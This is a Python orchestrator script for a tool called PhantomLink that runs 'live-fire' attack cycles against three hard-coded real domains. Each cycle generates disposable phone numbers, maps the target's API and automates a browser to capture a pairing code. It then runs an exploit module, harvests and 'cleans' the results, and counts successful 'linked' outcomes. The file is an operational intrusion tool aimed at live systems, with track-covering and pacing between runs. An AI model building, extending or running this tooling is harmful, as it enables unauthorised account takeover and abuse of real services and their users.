"""PhantomLink Phase 6: Live-Fire Orchestrator"""
import asyncio
import json
import sys
from datetime import datetime

from phantom.intel_sink import harvest_and_clean
from phantom.live_engage import engage_zapero
from phantom.live_exploit import run_exploit
from phantom.number_gen import generate_ghost_number
from phantom.recon import map_target

TARGETS = {
    "zapero": {"url": "https://afrivexa.com/home?invite_code=4750", "active": True},
    "waegy": {"url": "https://a1.waegy.com", "active": True},
    "wha7": {"url": "https://wha7.org", "active": True},
}

async def run_cycle(target_key, cycle_num, skip_engage=False):
    """Execute one complete PhantomLink live-fire cycle."""
    target = TARGETS[target_key]
    op_id = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    print(f"\n{'='*50}")
    print(f"  PhantomLink Live Fire — {target_key.upper()} | Cycle #{cycle_num}")
    print(f"{'='*50}")

    # Phase 1: Generate ghost number
    ghost_number, country = generate_ghost_number()
    print(f"[{op_id}] Ghost Number: {ghost_number} ({country})")

    # Phase 2: Recon
    api_map = map_target(target["url"])
    api_map["target_url"] = target["url"]
    print(f"[{op_id}] Confirm URL: {api_map.get('confirm_url')}")

    # Phase 3: Engage (skip if simulating)
    pairing_code = None
    if not skip_engage:
        print(f"[{op_id}] Engaging Zapero with live Zendriver...")
        engage_result = await engage_zapero(ghost_number)
        print(f"[{op_id}] Engage: success={engage_result['success']}")
        if engage_result.get('error'):
            print(f"[{op_id}] Error: {engage_result['error']}")
        if engage_result.get('network_log'):
            print(f"[{op_id}] Captured {len(engage_result['network_log'])} network requests")
        pairing_code = engage_result.get('pairing_code')
    else:
        pairing_code = f"SIM-{cycle_num}"
        print(f"[{op_id}] Using simulated pairing code: {pairing_code}")

    # Phase 4: Exploit
    if pairing_code:
        exploit_result = await run_exploit(api_map, pairing_code, ghost_number)
        print(f"[{op_id}] Exploit: vector={exploit_result['vector_used']} status={exploit_result['status']}")
        print(f"[{op_id}] Details: {json.dumps(exploit_result['details'])}")
    else:
        exploit_result = {"vector_used": None, "status": "no_pairing_code", "details": {}}
        print(f"[{op_id}] No pairing code captured — skipping exploit")

    # Phase 5: Harvest & Clean
    log_path = harvest_and_clean(ghost_number, exploit_result, op_id, target_key)
    print(f"[{op_id}] Log: {log_path}")
    print(f"[{op_id}] ✅ Cycle complete")

    return {"op_id": op_id, "ghost": ghost_number, "country": country,
            "code": pairing_code, "vector": exploit_result.get("vector_used"),
            "status": exploit_result.get("status")}

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="PhantomLink Live Fire")
    parser.add_argument("--target", "-t", default="zapero", choices=list(TARGETS.keys()))
    parser.add_argument("--cycles", "-n", type=int, default=3)
    parser.add_argument("--skip-engage", action="store_true", help="Simulate engagement")
    parser.add_argument("--preflight", action="store_true", help="Run preflight check only")
    args = parser.parse_args()

    if args.preflight:
        from phantom.live_preflight import preflight
        ok = await preflight()
        return 0 if ok else 1

    print("🔥 PhantomLink — Operation Silent Link — LIVE FIRE 🔥")
    print(f"Target: {args.target} | Cycles: {args.cycles}")

    results = []
    for i in range(1, args.cycles + 1):
        r = await run_cycle(args.target, i, args.skip_engage)
        results.append(r)
        if i < args.cycles:
            delay = 15 + (i * 5)
            print(f"\n⏳ Cooling down {delay}s before next cycle...")
            await asyncio.sleep(delay)

    # Final Report
    print("\n" + "="*60)
    print("  PHASE 6 LIVE-FIRE COMPLETE")
    print("="*60)
    vectors_used = set(r['vector'] for r in results if r['vector'])
    success_count = sum(1 for r in results if r['status'] == 'linked')
    print(f"  Cycles Run:    {len(results)}")
    print(f"  Successes:     {success_count}/{len(results)}")
    print(f"  Vector(s):     {', '.join(vectors_used) or 'None succeeded'}")
    print("="*60)
    return 0

if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
